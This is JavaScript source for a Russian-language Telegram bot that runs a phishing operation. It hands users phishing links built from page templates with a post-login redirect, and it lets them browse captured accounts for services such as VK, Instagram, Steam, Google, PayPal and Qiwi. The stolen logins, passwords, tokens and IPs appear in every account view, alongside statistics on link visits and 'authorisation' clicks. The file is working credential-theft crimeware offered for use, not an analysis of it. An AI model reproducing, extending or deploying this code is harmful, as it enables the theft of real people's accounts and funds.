const bot = require('./createBot')
const data = require('./database/models/userData')
const account = require('./database/models/account')
const link = require('./database/models/link')
const StringDate = require('./server/tools').GetStringDate
const sendMessageWK = require('./server/tools').CreateNewMessageWithKeyboard
const sendMessageWIK = require('./server/tools').CreateNewMessageWithInlineKeyboard

const names = {
    'vk': 'Вконтакте',
    'inst': 'Instagram',
    'ok': 'OK',
    'fb': 'Facebook',
    'tt': 'TikTok',
    'st': 'Steam',
    'wot': 'World of Tanks',
    'mc': 'Minecraft',
    'tg': 'Telegram',
    'sc': 'SocialClub',
    'sp': 'Samp',
    'ft': 'Fortnite',
    'ml': 'Mail',
    'ya': 'Yandex',
    'gl': 'Google',
    'yh': 'Yahoo',
    'tw': 'Twitter',
    'ds': 'Discord',
    'gj': 'Gaijin',
    'ms': 'Microsoft',
    'pr': 'Payeer',
    'psn': 'PSN',
    'pp': 'PayPal',
    'rb': 'Roblox',
    'az': 'Amazon',
    'qw': 'Qiwi',
    'wm': 'Webmoney',
}
const emptyString = '                                                                                           '

const links = {
    'vk': 'https://vk.com/',
    'inst': 'https://www.instagram.com/',
    'ok': 'https://ok.ru/profile/',
    'fb': 'https://ru-ru.facebook.com/profile.php?id=',
}
async function ShowLinks(callbackQuery) {
    const links = await link.find({
        tg_id: callbackQuery.message.chat.id,
        type: callbackQuery.data.split('_')[1]
    })
    if (links.length > 0) {
        let btnArray = []
        links.forEach(link => {
            btnArray[btnArray.length] = [{
                text: link.link,
                callback_data: 'showLinkInfo' + '_' + link._id
            }]
        })
        btnArray[btnArray.length] = [{
            text: 'Назад',
            callback_data: 'showLinksMenu'
        }]
        bot.editMessageText(`Выберите одну из ссылок ниже`, {
            chat_id: callbackQuery.message.chat.id,
            message_id: callbackQuery.message.message_id,
            reply_markup: {
                inline_keyboard: btnArray
            },
            parse_mode: 'HTML'
        })
    } else {
        bot.editMessageText(`К сожалению в данный момент у нас нет ссылок для этого сервиса`, {
            chat_id: callbackQuery.message.chat.id,
            message_id: callbackQuery.message.message_id,
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: 'Назад',
                        callback_data: 'showLinksMenu'
                    }]
                ]
            },
            parse_mode: 'HTML'
        })
    }
}
async function ShowLinkInfo(callbackQuery) {
    const links = await link.findById({
        _id: callbackQuery.data.split('_')[1]
    }).catch(err => {})
    let c = 0
    bot.deleteMessage(callbackQuery.message.chat.id, callbackQuery.message.message_id)
    bot.sendPhoto(callbackQuery.message.chat.id, links.query[c].image, {
        caption: `Шаблон #${c+1} [${links.query[c].name}]\n\n${links.query[c].description}\n\nВаша ссылка: <code>${links.link}/${callbackQuery.message.chat.id.toString(32)}?${c}</code>\n\n\ Перед после успешной авторизации: <code>${links.query[c].redirect}</code>`,
        reply_markup: {
            inline_keyboard: [

                links.query[c + 1] ? [{
                    text: '➡️',
                    callback_data: `showNextLinkQuery_${links._id}_${c}`
                }] : []

            ]
        },
        parse_mode: 'HTML'
    }).catch(err=>{
        bot.sendMessage(msg.chat.id, '(Image Error)К сожалению у нас произошла ошибка, пожалуйста обратитесь к администратору')
    })
}
async function showPrevLink(callbackQuery) {
    const links = await link.findById({
        _id: callbackQuery.data.split('_')[1]
    })
    // const user = await data.findOne({
    //     tg_id: callbackQuery.message.chat.id
    // })
    //let redirect = ''
    let c = Number(callbackQuery.data.split('_')[2]) - 1
    // user.redirect.map(e=>{
    //     e.id = callbackQuery.data.split('_')[1] ? redirect = e.redirect : links.query[c].redirect
    //     console.log(e.redirect)
    // })
    await bot.editMessageMedia({
        media: links.query[c].image,
        type: 'photo'
    }, {
        chat_id: callbackQuery.message.chat.id,
        message_id: callbackQuery.message.message_id,
        parse_mode: 'HTML'

    })
    await bot.editMessageCaption(`Шаблон #${c+1} [${links.query[c].name}]\n\n${links.query[c].description}\n\nВаша ссылка: <code>${links.link}/${callbackQuery.message.chat.id.toString(32)}?${c}</code>\n\n\ Перед после успешной авторизации: <code>${links.query[c].redirect}</code>`, {
        chat_id: callbackQuery.message.chat.id,
        message_id: callbackQuery.message.message_id,
        reply_markup: {
            inline_keyboard: [
                (links.query[c - 1] ? [{
                    text: '⬅️',
                    callback_data: `showPrevLinkQuery_${links._id}_${c}`
                }, {
                    text: '➡️',
                    callback_data: `showNextLinkQuery_${links._id}_${c}`
                }] : [{
                    text: '➡️',
                    callback_data: `showNextLinkQuery_${links._id}_${c}`
                }]),
                //[{text: 'Изменить ссылку после авторизации', callback_data:`changeUrl_${links._id}_${c}`}]
            ]
        },
        parse_mode: 'HTML',
    })
}
async function showNextLink(callbackQuery) {
    const links = await link.findById({
        _id: callbackQuery.data.split('_')[1]
    })
    let c = Number(callbackQuery.data.split('_')[2]) + 1
    await bot.editMessageMedia({
        media: links.query[c].image,
        type: 'photo'
    }, {
        chat_id: callbackQuery.message.chat.id,
        message_id: callbackQuery.message.message_id,
        parse_mode: 'HTML'

    })
    await bot.editMessageCaption(`Шаблон #${c+1} [${links.query[c].name}]\n\n${links.query[c].description}\n\nВаша ссылка: <code>${links.link}/${callbackQuery.message.chat.id.toString(32)}?${c}</code>\n\n\ Перед после успешной авторизации: <code>${links.query[c].redirect}</code>`, {
        chat_id: callbackQuery.message.chat.id,
        message_id: callbackQuery.message.message_id,
        reply_markup: {
            inline_keyboard: [
                (links.query[c + 1] ? [{
                    text: '⬅️',
                    callback_data: `showPrevLinkQuery_${links._id}_${c}`
                }, {
                    text: '➡️',
                    callback_data: `showNextLinkQuery_${links._id}_${c}`
                }] : [{
                    text: '⬅️',
                    callback_data: `showPrevLinkQuery_${links._id}_${c}`
                }]),
                [{
                    text: 'Изменить ссылку после авторизации',
                    callback_data: `changeUrl_${links._id}_${c}`
                }]
            ]
        },
        parse_mode: 'HTML',
    })
}
async function NextAccount(callbackQuery) {
    const accounts = await account.find({
        tg_id: callbackQuery.message.chat.id,
        type: callbackQuery.data.split('_')[1]
    })
    let c = Number(callbackQuery.data.split('_')[2]) + 1
    if (accounts[c + 1]) {
        if (callbackQuery.data.split('_')[1] == 'vk') {
            bot.editMessageText(`Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]} [Всего аккаунтов - ${accounts.length}]\n\n👤 Login: <code>${accounts[c].login}</code>\n🔑 Password: <code>${accounts[c].password}</code>\n⚙️ Token: <code>${accounts[c].token||'-'}</code>\n\n👥 Друзей: ${accounts[c].friends||'-'}\n👥 Подписчиков: ${accounts[c].friends||'-'} \n\n🕒 Дата: ${accounts[c].date}\n🔩 IP: ${accounts[c].token||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n${emptyString}[${c+1}/${accounts.length}]`, {
                chat_id: callbackQuery.message.chat.id,
                message_id: callbackQuery.message.message_id,
                reply_markup: {
                    inline_keyboard: [
                        [{
                                text: '⬅️',
                                callback_data: `prevAcc_${callbackQuery.data.split('_')[1]}_${c}`
                            },
                            {
                                text: 'Ссылка',
                                url: links[callbackQuery.data.split('_')[1]] + accounts[c].id
                            },
                            {
                                text: '➡️',
                                callback_data: `nextAcc_${callbackQuery.data.split('_')[1]}_${c}`
                            }
                        ],
                    ]
                },
                parse_mode: 'HTML'
            })
        } else {
            bot.editMessageText(`Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]} [Всего аккаунтов - ${accounts.length}]\n\n👤 Login: <code>${accounts[c].login}</code>\n🔑 Password: <code>${accounts[c].password}</code>\n\n🕒 Дата: ${accounts[c].date}\n🔩 IP: ${accounts[c].token||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n${emptyString}[${c+1}/${accounts.length}]`, {
                chat_id: callbackQuery.message.chat.id,
                message_id: callbackQuery.message.message_id,
                reply_markup: {
                    inline_keyboard: [
                        [{
                                text: '⬅️',
                                callback_data: `prevAcc_${callbackQuery.data.split('_')[1]}_${c}`
                            },
                            {
                                text: 'Ссылка',
                                url: links[callbackQuery.data.split('_')[1]] + accounts[c].id
                            },
                            {
                                text: '➡️',
                                callback_data: `nextAcc_${callbackQuery.data.split('_')[1]}_${c}`
                            }
                        ],
                    ]
                },
                parse_mode: 'HTML'
            })
        }
    } else {
        if (callbackQuery.data.split('_')[1] == 'vk') {
            bot.editMessageText(`Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]} [Всего аккаунтов - ${accounts.length}]\n\n👤 Login: <code>${accounts[c].login}</code>\n🔑 Password: <code>${accounts[c].password}</code>\n⚙️ Token: <code>${accounts[c].token||'-'}</code>\n\n👥 Друзей: ${accounts[c].friends||'-'}\n👥 Подписчиков: ${accounts[c].friends||'-'} \n\n🕒 Дата: ${accounts[c].date}\n🔩 IP: ${accounts[c].token||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n${emptyString}[${c+1}/${accounts.length}]`, {
                chat_id: callbackQuery.message.chat.id,
                message_id: callbackQuery.message.message_id,
                reply_markup: {
                    inline_keyboard: [
                        [{
                                text: '⬅️',
                                callback_data: `prevAcc_${callbackQuery.data.split('_')[1]}_${c}`
                            },
                            {
                                text: 'Ссылка',
                                url: links[callbackQuery.data.split('_')[1]] + accounts[c].id
                            }
                        ],
                    ]
                },
                parse_mode: 'HTML'
            })
        } else {
            bot.editMessageText(`Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]} [Всего аккаунтов - ${accounts.length}]\n\n👤 Login: <code>${accounts[c].login}</code>\n🔑 Password: <code>${accounts[c].password}</code>\n\n🕒 Дата: ${accounts[c].date}\n🔩 IP: ${accounts[c].token||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n${emptyString}[${c+1}/${accounts.length}]`, {
                chat_id: callbackQuery.message.chat.id,
                message_id: callbackQuery.message.message_id,
                reply_markup: {
                    inline_keyboard: [
                        [{
                                text: '⬅️',
                                callback_data: `prevAcc_${callbackQuery.data.split('_')[1]}_${c}`
                            },
                            {
                                text: 'Ссылка',
                                url: links[callbackQuery.data.split('_')[1]] + accounts[c].id
                            }
                        ],
                    ]
                },
                parse_mode: 'HTML'
            })
        }

    }
}
async function PreviousAccount(callbackQuery) {
    const accounts = await account.find({
        tg_id: callbackQuery.message.chat.id,
        type: callbackQuery.data.split('_')[1]
    })
    let c = Number(callbackQuery.data.split('_')[2]) - 1
    if (accounts[c - 1]) {
        if (callbackQuery.data.split('_')[1] == 'vk') {
            bot.editMessageText(`Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]} [Всего аккаунтов - ${accounts.length}]\n\n👤 Login: <code>${accounts[c].login}</code>\n🔑 Password: <code>${accounts[c].password}</code>\n⚙️ Token: <code>${accounts[c].token||'-'}</code>\n\n👥 Друзей: ${accounts[c].friends||'-'}\n👥 Подписчиков: ${accounts[c].friends||'-'} \n\n🕒 Дата: ${accounts[c].date}\n🔩 IP: ${accounts[c].token||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n${emptyString}[${c+1}/${accounts.length}]`, {
                chat_id: callbackQuery.message.chat.id,
                message_id: callbackQuery.message.message_id,
                reply_markup: {
                    inline_keyboard: [
                        [{
                                text: '⬅️',
                                callback_data: `prevAcc_${callbackQuery.data.split('_')[1]}_${c}`
                            },
                            {
                                text: 'Ссылка',
                                url: links[callbackQuery.data.split('_')[1]] + accounts[c].id
                            },
                            {
                                text: '➡️',
                                callback_data: `nextAcc_${callbackQuery.data.split('_')[1]}_${c}`
                            }
                        ],
                    ]
                },
                parse_mode: 'HTML'
            })
        } else {
            bot.editMessageText(`Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]} [Всего аккаунтов - ${accounts.length}]\n\n👤 Login: <code>${accounts[c].login}</code>\n🔑 Password: <code>${accounts[c].password}</code>\n\n🕒 Дата: ${accounts[c].date}\n🔩 IP: ${accounts[c].token||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n${emptyString}[${c+1}/${accounts.length}]`, {
                chat_id: callbackQuery.message.chat.id,
                message_id: callbackQuery.message.message_id,
                reply_markup: {
                    inline_keyboard: [
                        [{
                                text: '⬅️',
                                callback_data: `prevAcc_${callbackQuery.data.split('_')[1]}_${c}`
                            },
                            {
                                text: 'Ссылка',
                                url: links[callbackQuery.data.split('_')[1]] + accounts[c].id
                            },
                            {
                                text: '➡️',
                                callback_data: `nextAcc_${callbackQuery.data.split('_')[1]}_${c}`
                            }
                        ],
                    ]
                },
                parse_mode: 'HTML'
            })
        }
    } else {
        if (callbackQuery.data.split('_')[1] == 'vk') {
            bot.editMessageText(`Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]} [Всего аккаунтов - ${accounts.length}]\n\n👤 Login: <code>${accounts[c].login}</code>\n🔑 Password: <code>${accounts[c].password}</code>\n⚙️ Token: <code>${accounts[c].token||'-'}</code>\n\n👥 Друзей: ${accounts[c].friends||'-'}\n👥 Подписчиков: ${accounts[c].friends||'-'} \n\n🕒 Дата: ${accounts[c].date}\n🔩 IP: ${accounts[c].token||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n${emptyString}[${c+1}/${accounts.length}]`, {
                chat_id: callbackQuery.message.chat.id,
                message_id: callbackQuery.message.message_id,
                reply_markup: {
                    inline_keyboard: [
                        [{
                                text: 'Ссылка',
                                url: links[callbackQuery.data.split('_')[1]] + accounts[c].id
                            },
                            {
                                text: '➡️',
                                callback_data: `nextAcc_${callbackQuery.data.split('_')[1]}_${c}`
                            }
                        ],
                    ]
                },
                parse_mode: 'HTML'
            })
        } else {
            bot.editMessageText(`Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]} [Всего аккаунтов - ${accounts.length}]\n\n👤 Login: <code>${accounts[c].login}</code>\n🔑 Password: <code>${accounts[c].password}</code>\n\n🕒 Дата: ${accounts[c].date}\n🔩 IP: ${accounts[c].token||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n${emptyString}[${c+1}/${accounts.length}]`, {
                chat_id: callbackQuery.message.chat.id,
                message_id: callbackQuery.message.message_id,
                reply_markup: {
                    inline_keyboard: [
                        [{
                                text: 'Ссылка',
                                url: links[callbackQuery.data.split('_')[1]] + accounts[c].id
                            },
                            {
                                text: '➡️',
                                callback_data: `nextAcc_${callbackQuery.data.split('_')[1]}_${c}`
                            }
                        ],
                    ]
                },
                parse_mode: 'HTML'
            })
        }
    }
}
async function ShowAccounts(callbackQuery) {
    const accounts = await account.find({
        tg_id: callbackQuery.message.chat.id,
        type: callbackQuery.data.split('_')[1]
    })
    let c = 0
    if (accounts.length > 0) {
        if (accounts.length > 1) {
            if (callbackQuery.data.split('_')[1] == 'vk') {
                bot.editMessageText(`Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]} [Всего аккаунтов - ${accounts.length}]\n\n👤 Login: <code>${accounts[c].login}</code>\n🔑 Password: <code>${accounts[c].password}</code>\n⚙️ Token: <code>${accounts[c].token||'-'}</code>\n\n👥 Друзей: ${accounts[c].friends||'-'}\n👥 Подписчиков: ${accounts[c].friends||'-'} \n\n🕒 Дата: ${accounts[c].date}\n🔩 IP: ${accounts[c].token||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n${emptyString}[${c+1}/${accounts.length}]`, {
                    chat_id: callbackQuery.message.chat.id,
                    message_id: callbackQuery.message.message_id,
                    reply_markup: {
                        inline_keyboard: [
                            [{
                                    text: 'Ссылка',
                                    url: links[callbackQuery.data.split('_')[1]] + accounts[c].id
                                },
                                {
                                    text: '➡️',
                                    callback_data: `nextAcc_${callbackQuery.data.split('_')[1]}_${c}`
                                }
                            ],
                        ]
                    },
                    parse_mode: 'HTML'
                }).catch(err => {
                    console.log(err)
                })
            } else {
                bot.editMessageText(`Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]} [Всего аккаунтов - ${accounts.length}]\n\n👤 Login: <code>${accounts[c].login}</code>\n🔑 Password: <code>${accounts[c].password}</code>\n\n🕒 Дата: ${accounts[c].date}\n🔩 IP: ${accounts[c].token||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n${emptyString}[${c+1}/${accounts.length}]`, {
                    chat_id: callbackQuery.message.chat.id,
                    message_id: callbackQuery.message.message_id,
                    reply_markup: {
                        inline_keyboard: [
                            [{
                                    text: 'Ссылка',
                                    url: links[callbackQuery.data.split('_')[1]] + accounts[c].id
                                },
                                {
                                    text: '➡️',
                                    callback_data: `nextAcc_${callbackQuery.data.split('_')[1]}_${c}`
                                }
                            ],
                        ]
                    },
                    parse_mode: 'HTML'
                }).catch(err => {
                    console.log('2')
                })
            }
        } else {
            if (callbackQuery.data.split('_')[1] == 'vk') {
                bot.editMessageText(`Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]} [Всего аккаунтов - ${accounts.length}]\n\n👤 Login: <code>${accounts[c].login}</code>\n🔑 Password: <code>${accounts[c].password}</code>\n⚙️ Token: <code>${accounts[c].token||'-'}</code>\n\n👥 Друзей: ${accounts[c].friends||'-'}\n👥 Подписчиков: ${accounts[c].friends||'-'} \n\n🕒 Дата: ${accounts[c].date}\n🔩 IP: ${accounts[c].token||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n${emptyString}[${c+1}/${accounts.length}]`, {
                    chat_id: callbackQuery.message.chat.id,
                    message_id: callbackQuery.message.message_id,
                    reply_markup: {
                        inline_keyboard: [
                            [{
                                text: 'Ссылка',
                                url: links[callbackQuery.data.split('_')[1]] + accounts[c].id
                            }],
                        ]
                    },
                    parse_mode: 'HTML'
                }).catch(err => {
                    console.log('3')
                })
            } else {
                bot.editMessageText(`Ваши аккаунты ${names[callbackQuery.data.split('_')[1]]} [Всего аккаунтов - ${accounts.length}]\n\n👤 Login: <code>${accounts[c].login}</code>\n🔑 Password: <code>${accounts[c].password}</code>\n\n🕒 Дата: ${accounts[c].date}\n🔩 IP: ${accounts[c].token||'-'}\n🖥 Fake: ${accounts[c].fake||'-'}\n${emptyString}[${c+1}/${accounts.length}]`, {
                    chat_id: callbackQuery.message.chat.id,
                    message_id: callbackQuery.message.message_id,
                    reply_markup: {
                        inline_keyboard: [
                            [{
                                text: 'Ссылка',
                                url: links[callbackQuery.data.split('_')[1]] + accounts[c].id
                            }],
                        ]
                    },
                    parse_mode: 'HTML'
                }).catch(err => {
                    console.log('4')
                })
            }

        }
    } else {
        bot.editMessageText(`У вас нет аккаунтов ${names[callbackQuery.data.split('_')[1]]}`, {
            chat_id: callbackQuery.message.chat.id,
            message_id: callbackQuery.message.message_id,
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: 'Назад',
                        callback_data: 'showAccs_all'
                    }]
                ]
            },
            parse_mode: 'HTML'
        }).catch(err => {
            console.log('5')
        })
    }
}
async function ShowPrevAccsReplay(callbackQuery) {
    const ReplayList = [
        [{
            text: 'Вконтакте',
            callback_data: 'showAccs_vk'
        }, {
            text: 'Instagram',
            callback_data: 'showAccs_inst'
        }],
        [{
            text: 'Одноклассники',
            callback_data: 'showAccs_ok'
        }, {
            text: 'Facebook',
            callback_data: 'showAccs_fb'
        }],
        [{
            text: 'TikTok',
            callback_data: 'showAccs_tt'
        }, {
            text: 'Steam',
            callback_data: 'showAccs_st'
        }],

        [{
            text: 'World of Tanks',
            callback_data: 'showAccs_wot'
        }, {
            text: 'Minecraft',
            callback_data: 'showAccs_mc'
        }],
        [{
            text: 'Telegram',
            callback_data: 'showAccs_tg'
        }, {
            text: 'SocialClub',
            callback_data: 'showAccs_sc'
        }],
        [{
            text: 'Samp',
            callback_data: 'showAccs_sp'
        }, {
            text: 'Fortnite',
            callback_data: 'showAccs_ft'
        }],
        [{
            text: 'Mail',
            callback_data: 'showAccs_ml'
        }, {
            text: 'Yandex',
            callback_data: 'showAccs_ya'
        }],
        [{
            text: 'Google',
            callback_data: 'showAccs_gl'
        }, {
            text: 'Yahoo',
            callback_data: 'showAccs_yh'
        }],
        [{
            text: 'Twitter',
            callback_data: 'showAccs_tw'
        }, {
            text: 'Discord',
            callback_data: 'showAccs_ds'
        }],
        [{
            text: 'Gaijin',
            callback_data: 'showAccs_gj'
        }, {
            text: 'Microsoft',
            callback_data: 'showAccs_ms'
        }],
        [{
            text: 'Payeer',
            callback_data: 'showAccs_pr'
        }, {
            text: 'PSN',
            callback_data: 'showAccs_psn'
        }],
        [{
            text: 'PayPal',
            callback_data: 'showAccs_pp'
        }, {
            text: 'PSN',
            callback_data: 'showAccs_psn'
        }],
        [{
            text: 'Roblox',
            callback_data: 'showAccs_rb'
        }, {
            text: 'Amazon',
            callback_data: 'showAccs_az'
        }],
        [{
            text: 'Qiwi',
            callback_data: 'showAccs_qw'
        }, {
            text: 'Webmoney',
            callback_data: 'showAccs_wm'
        }],
    ]
    let id = Number(callbackQuery.data.split('_')[1])
    await bot.editMessageText(callbackQuery.message.text,
        {chat_id: callbackQuery.message.chat.id,
        message_id: callbackQuery.message.message_id,
        reply_markup: {
            inline_keyboard: [
                ReplayList[id-3]? ReplayList[id-3]:[],
                ReplayList[id-2]? ReplayList[id-2]:[],
                ReplayList[id-1] ? ReplayList[id-1]:[],
                ReplayList[id-4] ? [{text:'⬅️', callback_data: 'prevAccsReplay_'+Number(id-3)},{text:'➡️', callback_data: 'nextAccsReplay_'+Number(id)}] : [{text:'➡️', callback_data: 'nextAccsReplay_'+Number(id)}]
            ]
        }
    }).catch(err => {})
}
async function ShowNextAccsReplay(callbackQuery) {
    const ReplayList = [
        [{
            text: 'Вконтакте',
            callback_data: 'showAccs_vk'
        }, {
            text: 'Instagram',
            callback_data: 'showAccs_inst'
        }],
        [{
            text: 'Одноклассники',
            callback_data: 'showAccs_ok'
        }, {
            text: 'Facebook',
            callback_data: 'showAccs_fb'
        }],
        [{
            text: 'TikTok',
            callback_data: 'showAccs_tt'
        }, {
            text: 'Steam',
            callback_data: 'showAccs_st'
        }],

        [{
            text: 'World of Tanks',
            callback_data: 'showAccs_wot'
        }, {
            text: 'Minecraft',
            callback_data: 'showAccs_mc'
        }],
        [{
            text: 'Telegram',
            callback_data: 'showAccs_tg'
        }, {
            text: 'SocialClub',
            callback_data: 'showAccs_sc'
        }],
        [{
            text: 'Samp',
            callback_data: 'showAccs_sp'
        }, {
            text: 'Fortnite',
            callback_data: 'showAccs_ft'
        }],
        [{
            text: 'Mail',
            callback_data: 'showAccs_ml'
        }, {
            text: 'Yandex',
            callback_data: 'showAccs_ya'
        }],
        [{
            text: 'Google',
            callback_data: 'showAccs_gl'
        }, {
            text: 'Yahoo',
            callback_data: 'showAccs_yh'
        }],
        [{
            text: 'Twitter',
            callback_data: 'showAccs_tw'
        }, {
            text: 'Discord',
            callback_data: 'showAccs_ds'
        }],
        [{
            text: 'Gaijin',
            callback_data: 'showAccs_gj'
        }, {
            text: 'Microsoft',
            callback_data: 'showAccs_ms'
        }],
        [{
            text: 'Payeer',
            callback_data: 'showAccs_pr'
        }, {
            text: 'PayPal',
            callback_data: 'showAccs_pp'
        }],
        [{
            text: 'Roblox',
            callback_data: 'showAccs_rb'
        }, {
            text: 'Amazon',
            callback_data: 'showAccs_az'
        }],
        [{
            text: 'Qiwi',
            callback_data: 'showAccs_qw'
        }, {
            text: 'Webmoney',
            callback_data: 'showAccs_wm'
        }],
    ]
    let id = Number(callbackQuery.data.split('_')[1])
    await bot.editMessageText(callbackQuery.message.text,
        {chat_id: callbackQuery.message.chat.id,
        message_id: callbackQuery.message.message_id,
        reply_markup: {
            inline_keyboard: [
                ReplayList[id]?ReplayList[id]:[],
                ReplayList[id+1]?ReplayList[id+1]:[],
                ReplayList[id+2] ? ReplayList[id+2]:[],
                ReplayList[id+3] ? [{text:'⬅️', callback_data: 'prevAccsReplay_'+id},{text:'➡️', callback_data: 'nextAccsReplay_'+Number(id+3)}] : [{text:'⬅️', callback_data: 'prevAccsReplay_'+id}]
            ]
        }
    }).catch(err => {})
}
async function ShowPrevLinksReplay(callbackQuery) {
    const ReplayList = [
        [{
            text: 'Вконтакте',
            callback_data: 'showLinks_vk'
        }, {
            text: 'Instagram',
            callback_data: 'showLinks_inst'
        }],
        [{
            text: 'Одноклассники',
            callback_data: 'showLinks_ok'
        }, {
            text: 'Facebook',
            callback_data: 'showLinks_fb'
        }],
        [{
            text: 'TikTok',
            callback_data: 'showLinks_tt'
        }, {
            text: 'Steam',
            callback_data: 'showLinks_st'
        }],

        [{
            text: 'World of Tanks',
            callback_data: 'showLinks_wot'
        }, {
            text: 'Minecraft',
            callback_data: 'showLinks_mc'
        }],
        [{
            text: 'Telegram',
            callback_data: 'showLinks_tg'
        }, {
            text: 'SocialClub',
            callback_data: 'showLinks_sc'
        }],
        [{
            text: 'Samp',
            callback_data: 'showLinks_sp'
        }, {
            text: 'Fortnite',
            callback_data: 'showLinks_ft'
        }],
        [{
            text: 'Mail',
            callback_data: 'showLinks_ml'
        }, {
            text: 'Yandex',
            callback_data: 'showLinks_ya'
        }],
        [{
            text: 'Google',
            callback_data: 'showLinks_gl'
        }, {
            text: 'Yahoo',
            callback_data: 'showLinks_yh'
        }],
        [{
            text: 'Twitter',
            callback_data: 'showLinks_tw'
        }, {
            text: 'Discord',
            callback_data: 'showLinks_ds'
        }],
        [{
            text: 'Gaijin',
            callback_data: 'showLinks_gj'
        }, {
            text: 'Microsoft',
            callback_data: 'showLinks_ms'
        }],
        [{
            text: 'Payeer',
            callback_data: 'showLinks_pr'
        }, {
            text: 'PayPal',
            callback_data: 'showLinks_pp'
        }],
        [{
            text: 'Roblox',
            callback_data: 'showLinks_rb'
        }, {
            text: 'Amazon',
            callback_data: 'showLinks_az'
        }],
        [{
            text: 'Qiwi',
            callback_data: 'showLinks_qw'
        }, {
            text: 'Webmoney',
            callback_data: 'showLinks_wm'
        }],
    ]
    let id = Number(callbackQuery.data.split('_')[1])
    await bot.editMessageText(callbackQuery.message.text,
        {chat_id: callbackQuery.message.chat.id,
        message_id: callbackQuery.message.message_id,
        reply_markup: {
            inline_keyboard: [
                ReplayList[id-3]? ReplayList[id-3]:[],
                ReplayList[id-2]? ReplayList[id-2]:[],
                ReplayList[id-1] ? ReplayList[id-1]:[],
                ReplayList[id-4] ? [{text:'⬅️', callback_data: 'prevLinksReplay_'+Number(id-3)},{text:'➡️', callback_data: 'nextLinksReplay_'+Number(id)}] : [{text:'➡️', callback_data: 'nextLinksReplay_'+Number(id)}]
            ]
        }
    }).catch(err => {})
}
async function ShowNextLinksReplay(callbackQuery) {
    const ReplayList = [
        [{
            text: 'Вконтакте',
            callback_data: 'showLinks_vk'
        }, {
            text: 'Instagram',
            callback_data: 'showLinks_inst'
        }],
        [{
            text: 'Одноклассники',
            callback_data: 'showLinks_ok'
        }, {
            text: 'Facebook',
            callback_data: 'showLinks_fb'
        }],
        [{
            text: 'TikTok',
            callback_data: 'showLinks_tt'
        }, {
            text: 'Steam',
            callback_data: 'showLinks_st'
        }],

        [{
            text: 'World of Tanks',
            callback_data: 'showLinks_wot'
        }, {
            text: 'Minecraft',
            callback_data: 'showLinks_mc'
        }],
        [{
            text: 'Telegram',
            callback_data: 'showLinks_tg'
        }, {
            text: 'SocialClub',
            callback_data: 'showLinks_sc'
        }],
        [{
            text: 'Samp',
            callback_data: 'showLinks_sp'
        }, {
            text: 'Fortnite',
            callback_data: 'showLinks_ft'
        }],
        [{
            text: 'Mail',
            callback_data: 'showLinks_ml'
        }, {
            text: 'Yandex',
            callback_data: 'showLinks_ya'
        }],
        [{
            text: 'Google',
            callback_data: 'showLinks_gl'
        }, {
            text: 'Yahoo',
            callback_data: 'showLinks_yh'
        }],
        [{
            text: 'Twitter',
            callback_data: 'showLinks_tw'
        }, {
            text: 'Discord',
            callback_data: 'showLinks_ds'
        }],
        [{
            text: 'Gaijin',
            callback_data: 'showLinks_gj'
        }, {
            text: 'Microsoft',
            callback_data: 'showLinks_ms'
        }],
        [{
            text: 'Payeer',
            callback_data: 'showLinks_pr'
        }, {
            text: 'PayPal',
            callback_data: 'showLinks_pp'
        }],
        [{
            text: 'Roblox',
            callback_data: 'showLinks_rb'
        }, {
            text: 'Amazon',
            callback_data: 'showLinks_az'
        }],
        [{
            text: 'Qiwi',
            callback_data: 'showLinks_qw'
        }, {
            text: 'Webmoney',
            callback_data: 'showLinks_wm'
        }],
    ]
    let id = Number(callbackQuery.data.split('_')[1])
    await bot.editMessageText(callbackQuery.message.text,
        {chat_id: callbackQuery.message.chat.id,
        message_id: callbackQuery.message.message_id,
        reply_markup: {
            inline_keyboard: [
                ReplayList[id]?ReplayList[id]:[],
                ReplayList[id+1]?ReplayList[id+1]:[],
                ReplayList[id+2] ? ReplayList[id+2]:[],
                ReplayList[id+3] ? [{text:'⬅️', callback_data: 'prevLinksReplay_'+id},{text:'➡️', callback_data: 'nextLinksReplay_'+Number(id+3)}] : [{text:'⬅️', callback_data: 'prevLinksReplay_'+id}]
            ]
        }
    }).catch(err => {})
}
bot.onText(/Написать админу/, (msg) => {
    bot.sendMessage(msg.chat.id, 'Связаться с админом можно тут 👉🏻 ' + process.env.Admin)
})
bot.onText(/👤 Мой профиль/, async (msg) => {
    const user = await data.findOne({
        tg_id: msg.chat.id
    })
    if (user.isAccepted == 'true') {
        let visit = 0
        let authVist = 0
        let accountsToday = 0
        let accountsWeekend = 0
        let accountsAllTime = 0
        let admin = 'Пользователь'
        const accounts = await account.find({
            tg_id: msg.chat.id
        })
        if(user.vip){
            admin = 'VIP Пользователь'
        }
        if (user.isAdmin) {
            admin = 'Администратор'
        }
        user.links_info.map(link => {
            visit++
            if (link.auth_visit) {
                authVist++
            }
        })
        bot.sendMessage(msg.chat.id, `👤 Мой профиль\n\n🆔 ID: <code>${msg.chat.id}</code>\n🎗 Статус: ${admin}\n\n💸 Баланс: ${user.balance}₽\n\n☘️ Аккаунтов за сегодня: 0\n☘️ Аккаунтов за неделю: 0\n☘️ Аккаунтов за месяц: 0\n☘️ Аккаунтов за всё время: 0\n\n👀 Переходов за всё время: ${visit}\n🔐 Переходов на авторизацию за всё время: ${authVist}`, {
            parse_mode: 'HTML'
        })
        //
    }
})
